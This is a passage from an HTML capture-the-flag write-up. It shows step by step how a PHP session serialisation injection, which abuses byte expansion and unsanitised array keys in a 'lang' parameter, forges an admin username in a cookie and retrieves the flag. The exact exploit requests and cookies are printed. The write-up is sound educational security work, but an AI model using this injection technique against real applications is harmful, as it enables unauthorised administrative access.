  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"testing"</span>
<span class="token punctuation">}</span></code></pre>
<p>Notice that? The key in the array didn't get sanitised! We'll try to replicate this behaviour for the <code>lang</code> input using the following request.</p>
<h4>Request</h4>
<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/?lang[testing!]=testing!</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">web-dog-blog-d4cd3a85c452.c.sk8.dog</span></span>
...snip...</code></pre>
<h4>Response</h4>
<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
<span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">DOGSESSION=70643f95a6a53570083f477ddd38d0c4a%3A2%3A%7Bs%3A8%3A%26quot%3Busername%26quot%3B%3Bs%3A5%3A%26quot%3Bguest%26quot%3B%3Bs%3A4%3A%26quot%3Blang%26quot%3B%3Ba%3A1%3A%7Bs%3A8%3A%26quot%3Btesting%21%26quot%3B%3Bs%3A7%3A%26quot%3Btesting%26quot%3B%3B%7D%7D</span></span>
...snip...</code></pre>
<p>URL decoding the cookie gives us:</p>
<pre class="language-javascript"><code class="language-javascript">70643f95a6a53570083f477ddd38d0c4a<span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">s</span><span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>username<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">5</span><span class="token operator">:</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>guest<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>lang<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">;</span>a<span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">s</span><span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>testing<span class="token operator">!</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">7</span><span class="token operator">:</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>testing<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
<p>Which HTML decodes to:</p>
<pre class="language-javascript"><code class="language-javascript">70643f95a6a53570083f477ddd38d0c4a<span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">s</span><span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">5</span><span class="token operator">:</span><span class="token string">"guest"</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token string">"lang"</span><span class="token punctuation">;</span>a<span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">s</span><span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span><span class="token string">"testing!"</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">7</span><span class="token operator">:</span><span class="token string">"testing"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
<p>It worked! We can now bypass the sanitisation and attempt our attack.</p>
<h1>Attempting the exploit</h1>
<p>With all the concepts we have put together so far, we should be able to inject a <code>username</code> field with the value of <code>admin</code> into our serialised session. Making sure that the injection is successful requires a precise payload and is dependant on the current state of the session [*1]. To set up an initial session we can work with, we'll:</p>
<ol>
<li>Open the web application with no session.</li>
<li>Set our <code>lang</code> to <code>en</code>.</li>
<li>Login as the guest user.</li>
</ol>
<p>This generates the following session:</p>
<pre class="language-javascript"><code class="language-javascript"><span class="token literal-property property">b49e07e93b9b9eecfdedcde0c1c3645aa</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">s</span><span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token string">"lang"</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span><span class="token string">"en"</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">5</span><span class="token operator">:</span><span class="token string">"guest"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>From here, we can generate an exploit payload that leverages the <code>0xff</code> byte we found to be expanded when being encoded/decoded.</p>
<h4>Request</h4>
<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin?lang[%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff";s:5:"teste";}s:8:"username";s:5:"admin";}}]=test</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">web-dog-blog-d4cd3a85c452.c.sk8.dog</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">DOGSESSION=b49e07e93b9b9eecfdedcde0c1c3645aa%3A2%3A%7Bs%3A4%3A%26quot%3Blang%26quot%3B%3Bs%3A2%3A%26quot%3Ben%26quot%3B%3Bs%3A8%3A%26quot%3Busername%26quot%3B%3Bs%3A5%3A%26quot%3Bguest%26quot%3B%3B%7D</span></span>
...snip...</code></pre>
<h4>Response</h4>
<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
<span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">DOGSESSION=00f3b9050c4b069398b72a48409c0910a%3A2%3A%7Bs%3A4%3A%26quot%3Blang%26quot%3B%3Ba%3A1%3A%7Bs%3A66%3A%26quot%3B%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%26quot%3B%3Bs%3A5%3A%26quot%3Bteste%26quot%3B%3B%7Ds%3A8%3A%26quot%3Busername%26quot%3B%3Bs%3A5%3A%26quot%3Badmin%26quot%3B%3B%7D%7D%26quot%3B%3Bs%3A4%3A%26quot%3Btest%26quot%3B%3B%7Ds%3A8%3A%26quot%3Busername%26quot%3B%3Bs%3A5%3A%26quot%3Bguest%26quot%3B%3B%7D</span></span>
...snip...</code></pre>
<p>Below is the decoded cookie we got in the response.</p>
<pre class="language-http"><code class="language-http"><span class="token header"><span class="token header-name keyword">00f3b9050c4b069398b72a48409c0910a</span><span class="token punctuation">:</span><span class="token header-value">2:{s:4:"lang";a:1:{s:66:"&lt;66-GARBAGE-BYTES>";s:5:"teste";}s:8:"username";s:5:"admin";}}";s:4:"test";}s:8:"username";s:5:"guest";}</span></span></code></pre>
<p>We've successfully injected a <code>username</code> of <code>admin</code>! This looks good, but when we try to visit <code>admin.php</code> and get our flag we run into one more issue.</p>
<h4>Request</h4>
<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">web-dog-blog-d4cd3a85c452.c.sk8.dog</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">DOGSESSION=00f3b9050c4b069398b72a48409c0910a%3A2%3A%7Bs%3A4%3A%26quot%3Blang%26quot%3B%3Ba%3A1%3A%7Bs%3A66%3A%26quot%3B%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%26quot%3B%3Bs%3A5%3A%26quot%3Bteste%26quot%3B%3B%7Ds%3A8%3A%26quot%3Busername%26quot%3B%3Bs%3A5%3A%26quot%3Badmin%26quot%3B%3B%7D%7D%26quot%3B%3Bs%3A4%3A%26quot%3Btest%26quot%3B%3B%7Ds%3A8%3A%26quot%3Busername%26quot%3B%3Bs%3A5%3A%26quot%3Bguest%26quot%3B%3B%7D</span></span></code></pre>
<h4>Response</h4>
<pre class="language-http"><code class="language-http">...snip...
&lt;b>Fatal error&lt;/b>:  Uncaught TypeError: Cannot access offset of type array on array in /var/www/lib/translate.php:5
Stack trace:
#0 /var/www/tmpl/header.tmpl.php(6): T('BLOG_TITLE')
#1 /var/www/tmpl/admin.tmpl.php(1): require('/var/www/tmpl/h...')
#2 /var/www/html/admin.php(18): require_once('/var/www/tmpl/a...')
#3 {main}
  thrown in &lt;b>/var/www/lib/translate.php&lt;/b> on line &lt;b>5
...snip..</code></pre>
<p>Looking at the source code of <code>admin.tmpl.php</code> we can see the <code>T('BLOG_TITLE')</code> call that triggered the error (based on the above stack trace).</p>
<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">require</span> <span class="token string single-quoted-string">'header.tmpl.php'</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token function">T</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'BLOG_TITLE'</span><span class="token punctuation">)</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span> # Here's the error
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>welcome-message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token function">dog_is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant">CONFIG</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">T</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'BLOG_ADMIN_WELCOME'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">require</span> <span class="token string single-quoted-string">'footer.tmpl.php'</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre>
<p>Reviewing the <code>T()</code> function, we can spot the issue.</p>
<pre class="language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">T</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$lang</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'en'</span><span class="token punctuation">;</span> 
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$lang</span><span class="token punctuation">,</span> <span class="token constant">CONFIG</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'translations'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$lang</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'en'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> <span class="token constant">CONFIG</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'translations'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$lang</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$code</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>When we request <code>admin.php</code> it's trying to use our <code>$_SESSION['lang']</code> in an <code>array_key_exists()</code> call, but our <code>$_SESSION['lang']</code> is an array instead of the expected string type. This causes an error that stops the page from loading and prevents us from getting the flag. Luckily, due to the order of operations, we can actually change our <code>$_SESSION['lang']</code> value before we reach this check by simply defining a valid <code>lang</code> query parameter in our exploit request. This results in the following final exploit request that successfully gets the flag!</p>
<h4>Request</h4>
<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin.php?lang=en</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">web-dog-blog-d4cd3a85c452.c.sk8.dog</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">DOGSESSION=00f3b9050c4b069398b72a48409c0910a%3A2%3A%7Bs%3A4%3A%26quot%3Blang%26quot%3B%3Ba%3A1%3A%7Bs%3A66%3A%26quot%3B%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%26quot%3B%3Bs%3A5%3A%26quot%3Bteste%26quot%3B%3B%7Ds%3A8%3A%26quot%3Busername%26quot%3B%3Bs%3A5%3A%26quot%3Badmin%26quot%3B%3B%7D%7D%26quot%3B%3Bs%3A4%3A%26quot%3Btest%26quot%3B%3B%7Ds%3A8%3A%26quot%3Busername%26quot%3B%3Bs%3A5%3A%26quot%3Bguest%26quot%3B%3B%7D</span></span>
...snip...</code></pre>
<h4>Response</h4>
<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
...snip...
       &lt;div class="welcome-message">
            skbdg{i_serialously_thought_this_was_secure_af} 
        &lt;/div></code></pre>
<p>Woo! I really enjoyed this challenge, and it was the first difficult Hashkitten challenge that I've managed to solve, which has been a goal of mine for a while now. See you for the next Hashkitten challenge writeup, which undoubtably will have to be much longer haha.</p>
<h1>Notes</h1>
<ul>
<li>[*1] There was a bit more analysis that happened before narrowing it down to these two lines of code, but it was pretty clear that the custom serialised session was the focus for the challenge.</li>
<li>[*2] During the CTF I wrote a quick script that would generate a payload for any serialised data that I wanted to inject, making it much easier get the offsets correct. This script was hardcoded to work with the exact initial session I was working with at the time and is not very pretty, so I won't share it here.</li>
</ul>

		</div>
	</div>
  </body>


	<style>
		body {
			background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABTElEQVRYha1WWw7DMAjLquYYk7b7H7GTtq9UbWpsQ8fXVh4xJIAfz9f7227IZ9tC3do71bfW2lINPuvW3lP+w2cHgIxHUKZzDhu2yGeZjVAwV6d8EEh4BSw7V6fKvwNwDN37jWId/edYS1TCCqhIfwQ2fg/96QrmDNwyIkDKd+hPAOYgKijKLCt0DszCAKIrUfodQGbgVL9FZywzuqjPWSsie2ULH6HjoCT7kOUbiAI4FWGgYRdkZr4z9ZyxTdsQyR0bmGC1f6PDUIWYXLogCuwcrvzCbej0NRoqTvXUY7XbkA0V9l9t0ss2ZM5uu6kkjnrKB1Bm1fUdAYOUjDlmyov+hwCyC+n4ndEyVTGLEyr9nf0B50C2zJE4I9rmA5XH57wdSEorWSvyETIiNgUjSlWlXxAAU0ZZVRYYpWRD/rWOM7xCEhInuDqM2fwAG58SrpqDi2sAAAAASUVORK5CYII=");
			font-family: 'JetBrains Mono';
			background-color: #191B1C;
		}

		.content-container {
			background-color: #1D2021;
			box-sizing: content-box;
			width: 95vw;
			display: flex;
			flex-direction: column;
			justify-content: left;
			height: 100%;
			margin: auto;
			margin-top: 10vh;
			margin-bottom: 10vh;
			border: 1px solid #B8BB26;
			max-width: 150vh;
		}

		.text-container {
			color: #D3C4A1;
			padding: 1vw;
			font-size: calc(0.7vw + 0.7vh);
		}

		ul {
			padding-left: 2vh;	
		}

		code:not([class]) {
			color: #B8BB26;
			font-size: calc(0.7vw + 0.7vh);
			font-style: italic; 
		}

		a {
			color: #B8BB26;
			font-weight: bold;
			text-decoration: underline;
		}

		/**
		 * Gruvbox dark theme
		 *
		 * Adapted from a theme based on:
		 * Vim Gruvbox dark Theme (https://github.com/morhetz/gruvbox)
		 *
		 * @author Azat S. <to@azat.io>
		 * @version 1.0
		 */

		code[class*="language-"],
		pre[class*="language-"] {
			color: #ebdbb2; /* fg1 / fg */
			font-family: Consolas, Monaco, "Andale Mono", monospace;
			direction: ltr;
			text-align: left;
			white-space: pre;
			word-spacing: normal;
			word-break: normal;
			line-height: 1.5;

			-moz-tab-size: 4;
			-o-tab-size: 4;
			tab-size: 4;

			-webkit-hyphens: none;
			-moz-hyphens: none;
			-ms-hyphens: none;
			hyphens: none;
		}

		pre[class*="language-"]::-moz-selection,
		pre[class*="language-"] ::-moz-selection,
		code[class*="language-"]::-moz-selection,
		code[class*="language-"] ::-moz-selection {
			color: #fbf1c7; /* fg0 */
			background: #7c6f64; /* bg4 */
		}

		pre[class*="language-"]::selection,
		pre[class*="language-"] ::selection,
		code[class*="language-"]::selection,
		code[class*="language-"] ::selection {
			color: #fbf1c7; /* fg0 */
			background: #7c6f64; /* bg4 */
		}

		/* Code blocks */
		pre[class*="language-"] {
			padding: 1em;
			margin: 0.5em 0;
			overflow: auto;
		}

		:not(pre) > code[class*="language-"],
		pre[class*="language-"] {
			background: #191B1C; /* bg0_h */
			border: 1px solid #665C54;
		}

		/* Inline code */
		:not(pre) > code[class*="language-"] {
			padding: 0.1em;
			border-radius: 0.3em;
		}

		.token.comment,
		.token.prolog,
		.token.cdata {
			color: #a89984; /* fg4 / gray1 */
		}

		.token.delimiter,
		.token.boolean,
		.token.keyword,
		.token.selector,
		.token.important,
		.token.atrule {
			color: #fb4934; /* red2 */
		}

		.token.operator,
		.token.punctuation,
		.token.attr-name {
			color: #a89984; /* fg4 / gray1 */
		}

		.token.tag,
		.token.tag .punctuation,
		.token.doctype,
		.token.builtin {
			color: #fabd2f; /* yellow2 */
		}

		.token.entity,
		.token.number,
		.token.symbol {
			color: #d3869b; /* purple2 */
		}

		.token.property,
		.token.constant,
		.token.variable {
			color: #fb4934; /* red2 */
		}

		.token.string,
		.token.char {
			color: #b8bb26; /* green2 */
		}

		.token.attr-value,
		.token.attr-value .punctuation {
			color: #a89984; /* fg4 / gray1 */
		}

		.token.url {
			color: #b8bb26; /* green2 */
		}

		.token.function {
			color: #fabd2f; /* yellow2 */
		}

		.token.regex {
			background: #b8bb26; /* green2 */
		}

		.token.bold {
			font-weight: bold;
		}

		.token.italic {
			font-style: italic;
		}

		.token.inserted {
			background: #a89984; /* fg4 / gray1 */
		}

		.token.deleted {
			background: #fb4934; /* red2 */
		}
	</style>
</html>
